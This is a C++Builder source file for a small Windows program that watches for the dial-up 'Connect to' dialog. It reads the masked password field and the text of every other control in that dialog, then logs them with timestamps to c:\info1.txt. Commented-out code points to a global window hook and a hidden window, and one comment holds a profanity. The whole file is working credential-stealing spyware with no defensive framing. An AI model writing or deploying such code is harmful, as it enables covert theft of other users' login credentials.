//---------------------------------------------------------------------------
#include <vcl.h>
#pragma hdrstop

#include "Unit1.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm1 *Form1;
//---------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner)
        : TForm(Owner)
{
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button1Click(TObject *Sender)
{
//SendMessage(Edit1->Handle,EM_SETPASSWORDCHAR ,0,0);
HWND hwnd=FindWindow(0,"连接到");
if(!hwnd)
{ShowMessage("no find");
return;
}
HWND h1=GetWindow(hwnd,GW_CHILD);
int style;
HWND h2=0;
while(h1)
{
  style=GetWindowLong(h1,GWL_STYLE);
  if(style&ES_PASSWORD)
     {h2=h1;  ShowMessage("fond");break;}

   h1=GetWindow(h1,GW_HWNDNEXT);


}
  if(h2)
  {
  char str[128];
  SendMessage(h2,WM_GETTEXT,120,(long)str);
  ShowMessage(str);
  //SendMessage(h2,EM_SETPASSWORDCHAR,0,0);
  //SendMessage(hwnd,WM_PAINT,0,0);
//  BringWindowToTop(hwnd);
//  SetWindowText(h2,"fuck you");
  }


}
//---------------------------------------------------------------------------
void __fastcall TForm1::Button2Click(TObject *Sender)
{
//hhook=SetWindowsHookEx(WH_CALLWNDPROC,(HOOKPROC)MyHook,HInstance,0);

}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button3Click(TObject *Sender)
{
 //UnhookWindowsHookEx(hhook);
}
//---------------------------------------------------------------------------





void TForm1::OnCreate(TMessage msg)
{
//(CREATESTRUCT *)msg.LParam)->style&=~WS_VISIBLE;
  TForm::Dispatch(&msg);

}


void __fastcall TForm1::Timer1Timer(TObject *Sender)
{
        HWND hwnd=FindWindow(0,"连接到");
        if(!hwnd)
        {
        return ;
        }
       list1=new TStringList;
       list2=new TStringList;
       if(FileExists("c:\\info1.txt"))
       list1->LoadFromFile("c:\\info1.txt");
        Timer1->Enabled=false;
        Timer2->Enabled=true;
        Timer3->Enabled=true;

}
//---------------------------------------------------------------------------

void __fastcall TForm1::Timer2Timer(TObject *Sender)
{
       HWND hwnd=FindWindow(0,"连接到");
       if(!hwnd)
       return;

         list2->Clear();

        HWND h1=GetWindow(hwnd,GW_CHILD);
       char text[128];
        while(h1)
        {

          SendMessage(h1,WM_GETTEXT,100,(long)text);
          list2->Add(text);
           h1=GetWindow(h1,GW_HWNDNEXT);
           }
        list2->Add("================================");
//        list2->Add("++++++++++++++++++++++++");

}
//---------------------------------------------------------------------------

void __fastcall TForm1::Timer3Timer(TObject *Sender)
{
        HWND hwnd=FindWindow(0,"连接到");
        if(!hwnd)
        {
        list1->AddStrings(list2);
        list1->Add(DateTimeToStr(Now()));
        list1->Add("================================= ");
        list1->SaveToFile("c:\\info1.txt");
        delete list1;
        delete list2;
        Timer1->Enabled=true;
         Timer2->Enabled=false;
         Timer3->Enabled=false;}
}
//---------------------------------------------------------------------------

